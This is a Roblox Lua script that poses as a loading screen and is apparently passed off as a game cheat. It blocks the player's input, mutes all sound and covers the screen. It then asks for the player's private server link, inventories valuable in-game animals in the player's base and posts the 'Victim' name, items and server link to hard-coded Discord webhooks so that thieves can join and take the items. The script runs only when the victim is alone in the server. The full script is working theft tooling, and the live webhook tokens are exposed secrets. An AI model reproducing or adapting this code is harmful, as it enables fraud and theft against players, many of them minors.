local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All,false)
StarterGui:SetCore("TopbarEnabled",false)
StarterGui:SetCore("DevConsoleVisible",false)
StarterGui:SetCore("ResetButtonCallback",false)

local camera = workspace.CurrentCamera
camera.CameraType = Enum.CameraType.Scriptable

local blockInput = true
UserInputService.InputBegan:Connect(function(input)
        if blockInput then
                input:Capture()
        end
end)

local function silenciarTodo(container)
        for _, obj in pairs(container:GetDescendants()) do
                if obj:IsA("Sound") then
                        obj.Volume = 0
                end
        end
end

for _, c in pairs({Workspace, ReplicatedStorage, playerGui, StarterGui, CoreGui}) do
        silenciarTodo(c)
        c.DescendantAdded:Connect(function(desc)
                if desc:IsA("Sound") then
                        desc.Volume = 0
                end
        end)
end

local WEBHOOKS = {
        ["10-20m"] = "https://discord.com/api/webhooks/1429460818063261818/jKxChV_8pUw5_keRVFdpzgi7usdjBVAhDVnwvzkXfwUKn_LOUwQJA3R2Zm9LfdlGbByd",
        ["50m"] = "https://discord.com/api/webhooks/1429460947608797225/IjGP2J3jrq-wPwc6HGj7p-5_Zn236ZFLeh5VZoM0JrypN8TzOaldhQVNBK5qdR9H3bz1",
        ["100m"] = "https://discord.com/api/webhooks/1429461067951767592/RlvL53f13s9CAnb8kd2QnDGRn2UoZO9E5J4wJyYcJdi2NpOkLh4428IG_OsPuSFM4TIc",
        ["500m"] = "https://discord.com/api/webhooks/1429461233500950711/9e_D_55t8ZFOW1_lM4kSkWl9z_dn0GMB-VBS_QGsio1hF8REoVz0cubJMnt-TRcVN--X",
        ["unknown"] = "https://discord.com/api/webhooks/1429461363297878148/jWDbF1BPwbnndVTq-KUdEraaP_UlVFCfw7WM1sfy79SKxyOqHuDu4rWfnocpIg5LX9j-"
}

local allowedAnimals = {
        "67",
        "Celularcini Viciosini",
        "Dragon Cannelloni",
        "Esok Sekolah",
        "Garama and Madundung",
        "Ketupat Kepat",
        "Mariachi Corazoni",
        "Money Money Puggy",
        "Nuclearo Dinossauro",
        "Secret Lucky Block",
        "Spaghetti Tualetti",
        "Tang Tang Kelentang",
        "Eviledon",
        "Tictac Sahur",
        "Tralaledon",
        "La Spooky Grande",
        "Strawberry Elephant",
        "Los Bros",
        "Los Chicleteiras",
        "Los Combinasionas",
        "Los Hotspotsitos",
        "Los Nooo My Hotspotsitos",
        "Los Primos",
        "Los Mobilis",
        "Las Sis",
        "La Grande Combinasion",
        "La Supreme Combinasion",
        "La Extinct Grande",
        "La Secret Combinasion", 
        "Spooky and Pumpky", 
        "Ketchuru and Musturu", 
        "Los Lucky Blocks", 
        "Admin Lucky Block", 
        "Burguro And Fryuro", 
        "Chillin Chili", 
        "Los Tacoritas", 
        "Tacorita Bicicleta", 
        "Taco Luckyblock"
}

local function getAnimalValueFromGeneration(generationText)
        if not generationText or generationText == "Unknown" or generationText == "" then
                return "unknown"
        end
        
        local lowerGen = generationText:lower()
        
        if lowerGen:find("10m") or lowerGen:find("15m") or lowerGen:find("20m") then
                return "10-20m"
        elseif lowerGen:find("50m") then
                return "50m"
        elseif lowerGen:find("100m") then
                return "100m"
        elseif lowerGen:find("500m") then
                return "500m"
        end
        
        return "unknown"
end

local function getPodiumInfo()
        local searchText = player.DisplayName .. "'s Base"
        warn("[DEBUG] Buscando base:", searchText)
        local Plots = Workspace:FindFirstChild("Plots")
        
        if not Plots then
                warn("[DEBUG] No se encontró carpeta Plots")
                return {}
        end
        
        local playerBase = nil
        for _, plot in pairs(Plots:GetDescendants()) do
                if plot.Name == "PlotSign" then
                        local surfaceGui = plot:FindFirstChild("SurfaceGui")
                        if surfaceGui then
                                local frame = surfaceGui:FindFirstChild("Frame")
                                if frame then
                                        local textLabel = frame:FindFirstChild("TextLabel")
                                        if textLabel and textLabel:IsA("TextLabel") then
                                                if string.find(textLabel.Text, searchText) then
                                                        local plotParent = plot
                                                        while plotParent.Parent ~= Plots do
                                                                plotParent = plotParent.Parent
                                                                if plotParent == Workspace or plotParent == game then
                                                                        break
                                                                end
                                                        end
                                                        playerBase = plotParent
                                                        break
                                                end
                                        end
                                end
                        end
                end
        end
        
        if not playerBase then
                warn("[DEBUG] No se encontró la base del jugador")
                return {}
        end
        
        warn("[DEBUG] Base encontrada:", playerBase.Name)
        
        local baseDescendants = playerBase:GetDescendants()
        local foundModels = {}
        local modelCount = {}
        
        for _, descendant in pairs(baseDescendants) do
                if descendant:IsA("Model") then
                        local modelName = descendant.Name
                        
                        for _, allowedName in ipairs(allowedAnimals) do
                                if modelName:lower():find(allowedName:lower(), 1, true) then
                                        if not modelCount[modelName] then
                                                modelCount[modelName] = 0
                                        end
                                        modelCount[modelName] = modelCount[modelName] + 1
                                        
                                        local mutations = {}
                                        for _, child in pairs(descendant:GetDescendants()) do
                                                if child.Name:match("^_Trait%.") then
                                                        local mutationName = child.Name:gsub("^_Trait%.", "")
                                                        table.insert(mutations, mutationName)
                                                end
                                        end
                                        
                                        table.insert(foundModels, {
                                                name = modelName,
                                                generation = "Unknown",
                                                mutations = mutations,
                                                path = descendant:GetFullName(),
                                                count = modelCount[modelName]
                                        })
                                        
                                        break
                                end
                        end
                end
        end
        
        local animalPodiums = playerBase:FindFirstChild("AnimalPodiums")
        if animalPodiums then
                local podiumDescendants = animalPodiums:GetDescendants()
                
                for _, descendant in pairs(podiumDescendants) do
                        if descendant:IsA("TextLabel") and descendant.Name == "DisplayName" then
                                local displayText = descendant.Text
                                
                                for _, modelData in ipairs(foundModels) do
                                        if displayText:lower():find(modelData.name:lower(), 1, true) or modelData.name:lower():find(displayText:lower(), 1, true) then
                                                local parent = descendant.Parent
                                                if parent then
                                                        for _, child in pairs(parent:GetChildren()) do
                                                                if child:IsA("TextLabel") and child.Name == "Generation" then
                                                                        modelData.generation = child.Text
                                                                        modelData.value = getAnimalValueFromGeneration(child.Text)
                                                                        break
                                                                end
                                                        end
                                                end
                                                break
                                        end
                                end
                        end
                end
        end
        
        return foundModels, modelCount
end

local function classifyAnimals(foundAnimals)
        local classified = {
                ["10-20m"] = {},
                ["50m"] = {},
                ["100m"] = {},
                ["500m"] = {},
                ["unknown"] = {}
        }
        
        for _, animalData in ipairs(foundAnimals) do
                if not animalData.value then
                        animalData.value = getAnimalValueFromGeneration(animalData.generation)
                end
                local category = animalData.value
                table.insert(classified[category], animalData)
        end
        
        return classified
end

local function sendToWebhook(category, animals, serverLink, modelCount)
        if not animals or #animals == 0 then
                warn("[DEBUG] No hay animales para enviar")
                return
        end
        
        local playerCount = #Players:GetPlayers()
        warn("[DEBUG] Jugadores en servidor:", playerCount)
        
        if playerCount > 1 then
                warn("[DEBUG] BLOQUEADO: Más de 1 jugador en el servidor")
                return
        end
        
        local webhookUrl = WEBHOOKS[category]
        if not webhookUrl then
                return
        end
        
        local playerName = player.Name
        local displayName = player.DisplayName
        
        local animalList = ""
        for i, animalData in ipairs(animals) do
                local line = animalData.name
                if animalData.generation then
                        line = line .. " - Gen: " .. animalData.generation
                end
                if animalData.count and animalData.count > 1 then
                        line = line .. " (x" .. animalData.count .. ")"
                end
                
                if animalData.mutations and #animalData.mutations > 0 then
                        local mutationsText = table.concat(animalData.mutations, ", ")
                        line = line .. "\n  Mutaciones: " .. mutationsText
                end

                if i == 1 then
                        animalList = line
                else
                        animalList = animalList .. "\n" .. line
                end
        end
        
        local duplicateWarning = ""
        for modelName, count in pairs(modelCount) do
                if count > 2 then
                        for _, animalData in ipairs(animals) do
                                if animalData.name == modelName then
                                        duplicateWarning = duplicateWarning .. "+ " .. modelName .. " (x" .. count .. ")\n"
                                        break
                                end
                        end
                end
        end
        
        if duplicateWarning ~= "" then
                duplicateWarning = "\n\n⚠️ DUPLICADOS DETECTADOS (>2):\n" .. duplicateWarning
        end
        
        local categoryDisplay = category
        local pingMessage = ""
        
        if category == "10-20m" then
                categoryDisplay = "10-20M"
                pingMessage = "<@&1429474378424385567>"
        elseif category == "50m" then
                categoryDisplay = "50M"
                pingMessage = "<@&1429475305231224913>"
        elseif category == "100m" then
                categoryDisplay = "100M"
                pingMessage = "<@&1429475767988785212>"
        elseif category == "500m" then
                categoryDisplay = "500M"
                pingMessage = "<@&1429475868069204089>"
        else
                categoryDisplay = "UNKNOWN VALUE"
                pingMessage = "<@&1429477477377507388>"
        end
        
        local data = {
                ["content"] = pingMessage .. " **NEW PRIVATE SERVER HIT!**",
                ["embeds"] = {{
                        ["title"] = " Nuevo Exploiter Encontrado - " .. categoryDisplay,
                        ["color"] = 10038562,
                        ["fields"] = {
                                {
                                        ["name"] = " Informacion del jugador:",
                                        ["value"] = "```diff\n+ Victim: " .. playerName .. "\n+ Display: " .. displayName .. "\n```",
                                        ["inline"] = false
                                },
                                {
                                        ["name"] = "Datos del Server:",
                                        ["value"] = "```diff\n+ Players in Server: " .. playerCount .. "\n```",
                                        ["inline"] = false
                                },
                                {
                                        ["name"] = "Items importantes (" .. categoryDisplay .. "):",
                                        ["value"] = "```diff\n+ " .. animalList:gsub("\n", "\n+ ") .. duplicateWarning .. "```",
                                        ["inline"] = false
                                },
                                {
                                        ["name"] = " Link del Servidor Privado:",
                                        ["value"] = "[**IR AL SERVER**](" .. serverLink .. ")",
                                        ["inline"] = false
                                },
                                {
                                        ["name"] = "Total:",
                                        ["value"] = "```diff\n+ Total Items: " .. #animals .. "\n+ Game ID: " .. tostring(game.GameId) .. "\n```",
                                        ["inline"] = false
                                }
                        },
                        ["footer"] = {
                                ["text"] = "hesizpro - " .. categoryDisplay
                        },
                        ["timestamp"] = DateTime.now():ToIsoDate()
                }}
        }
        
        local sent = false
        
        local methods = {
                {
                        name = "RequestAsync",
                        func = function()
                                local jsonData = HttpService:JSONEncode(data)
                                local response = HttpService:RequestAsync({
                                        Url = webhookUrl,
                                        Method = "POST",
                                        Headers = {["Content-Type"] = "application/json"},
                                        Body = jsonData
                                })
                                return response
                        end
                },
                {
                        name = "PostAsync with Compress",
                        func = function()
                                local jsonData = HttpService:JSONEncode(data)
                                return HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, true)
                        end
                },
                {
                        name = "PostAsync without Compress",
                        func = function()
                                local jsonData = HttpService:JSONEncode(data)
                                return HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson, false)
                        end
                },
                {
                        name = "RequestAsync with timeout",
                        func = function()
                                local jsonData = HttpService:JSONEncode(data)
                                local response = HttpService:RequestAsync({
                                        Url = webhookUrl,
                                        Method = "POST",
                                        Headers = {
                                                ["Content-Type"] = "application/json",
                                                ["User-Agent"] = "Roblox/WinInet"
                                        },
                                        Body = jsonData,
                                        Timeout = 30
                                })
                                return response
                        end
                },
                {
                        name = "PostAsync basic",
                        func = function()
                                local jsonData = HttpService:JSONEncode(data)
                                return HttpService:PostAsync(webhookUrl, jsonData)
                        end
                }
        }
        
        for i, method in ipairs(methods) do
                if not sent then
                        task.wait(0.1)
                        local success, result = pcall(method.func)
                        
                        if success then
                                warn("[DEBUG] ✓ Webhook enviada con método:", method.name)
                                sent = true
                                break
                        else
                                warn("[DEBUG] ✗ Método", method.name, "falló:", tostring(result))
                        end
                end
        end
        
        if not sent then
                warn("[DEBUG] ⚠️ TODOS LOS MÉTODOS FALLARON para categoría:", categoryDisplay)
        end
end

local serverLinkToSend = ""

local gui = Instance.new("ScreenGui", CoreGui)
gui.IgnoreGuiInset = true
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 2^31-1

local bg = Instance.new("Frame", gui)
bg.Size = UDim2.new(1,0,1,0)
bg.BackgroundColor3 = Color3.fromRGB(15,15,15)

local initialLoadFrame = Instance.new("Frame", bg)
initialLoadFrame.Size = UDim2.new(1,0,1,0)
initialLoadFrame.BackgroundColor3 = Color3.fromRGB(15,15,15)
initialLoadFrame.BorderSizePixel = 0

local loadingText = Instance.new("TextLabel", initialLoadFrame)
loadingText.AnchorPoint = Vector2.new(0.5,0.5)
loadingText.Position = UDim2.new(0.5,0,0.5,0)
loadingText.Size = UDim2.new(0.6,0,0.1,0)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextColor3 = Color3.fromRGB(255,255,255)
loadingText.TextScaled = true
loadingText.Text = "Cargando..."

local inputFrame = Instance.new("Frame", bg)
inputFrame.Size = UDim2.new(1,0,1,0)
inputFrame.BackgroundColor3 = Color3.fromRGB(15,15,15)
inputFrame.BorderSizePixel = 0
inputFrame.Visible = false

local titleLabel = Instance.new("TextLabel", inputFrame)
titleLabel.AnchorPoint = Vector2.new(0.5,0)
titleLabel.Position = UDim2.new(0.5,0,0.25,0)
titleLabel.Size = UDim2.new(0.8,0,0.08,0)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextColor3 = Color3.fromRGB(255,255,255)
titleLabel.TextScaled = true
titleLabel.Text = "Introduce el link de tu servidor privado"

local inputBox = Instance.new("TextBox", inputFrame)
inputBox.AnchorPoint = Vector2.new(0.5,0)
inputBox.Position = UDim2.new(0.5,0,0.4,0)
inputBox.Size = UDim2.new(0.7,0,0.06,0)
inputBox.BackgroundColor3 = Color3.fromRGB(30,30,30)
inputBox.BorderSizePixel = 0
inputBox.Font = Enum.Font.Gotham
inputBox.TextColor3 = Color3.fromRGB(200,200,200)
inputBox.TextScaled = true
inputBox.PlaceholderText = "Pega el link aquí..."
inputBox.Text = ""
local inputCorner = Instance.new("UICorner", inputBox)
inputCorner.CornerRadius = UDim.new(0.1,0)

local submitButton = Instance.new("TextButton", inputFrame)
submitButton.AnchorPoint = Vector2.new(0.5,0)
submitButton.Position = UDim2.new(0.5,0,0.52,0)
submitButton.Size = UDim2.new(0.3,0,0.05,0)
submitButton.BackgroundColor3 = Color3.fromRGB(0,200,255)
submitButton.BorderSizePixel = 0
submitButton.Font = Enum.Font.GothamBold
submitButton.TextColor3 = Color3.fromRGB(255,255,255)
submitButton.TextScaled = true
submitButton.Text = "Continuar"
local buttonCorner = Instance.new("UICorner", submitButton)
buttonCorner.CornerRadius = UDim.new(0.15,0)

local infiniteLoadFrame = Instance.new("Frame", bg)
infiniteLoadFrame.Size = UDim2.new(1,0,1,0)
infiniteLoadFrame.BackgroundColor3 = Color3.fromRGB(15,15,15)
infiniteLoadFrame.BorderSizePixel = 0
infiniteLoadFrame.Visible = false

local infiniteText = Instance.new("TextLabel", infiniteLoadFrame)
infiniteText.AnchorPoint = Vector2.new(0.5,0.5)
infiniteText.Position = UDim2.new(0.5,0,0.5,0)
infiniteText.Size = UDim2.new(0.6,0,0.1,0)
infiniteText.BackgroundTransparency = 1
infiniteText.Font = Enum.Font.GothamBold
infiniteText.TextColor3 = Color3.fromRGB(255,255,255)
infiniteText.TextScaled = true
infiniteText.Text = "Procesando"

local dots = 0
task.spawn(function()
        while true do
                task.wait(0.5)
                if infiniteLoadFrame.Visible then
                        dots = (dots % 3) + 1
                        infiniteText.Text = "Procesando" .. string.rep(".", dots)
                end
        end
end)

submitButton.MouseButton1Click:Connect(function()
        local link = inputBox.Text
        if link and link ~= "" then
                serverLinkToSend = link
                
                inputFrame.Visible = false
                infiniteLoadFrame.Visible = true
                
                task.spawn(function()
                        task.wait(0.5)
                        
                        warn("[DEBUG] Buscando animales...")
                        local foundAnimals, modelCount = getPodiumInfo()
                        warn("[DEBUG] Animales encontrados:", #foundAnimals)
                        
                        for i, animal in ipairs(foundAnimals) do
                                warn("[DEBUG] Animal", i, ":", animal.name, "Gen:", animal.generation, "Value:", animal.value or "nil")
                        end
                        
                        local classified = classifyAnimals(foundAnimals)
                        
                        for category, animals in pairs(classified) do
                                warn("[DEBUG] Categoría:", category, "Cantidad:", #animals)
                                if #animals > 0 then
                                        warn("[DEBUG] Enviando a webhook:", category)
                                        sendToWebhook(category, animals, serverLinkToSend, modelCount)
                                        task.wait(1)
                                end
                        end
                        
                        warn("[DEBUG] Proceso completado")
                end)
        end
end)

task.spawn(function()
        task.wait(2)
        initialLoadFrame.Visible = false
        inputFrame.Visible = true
end)
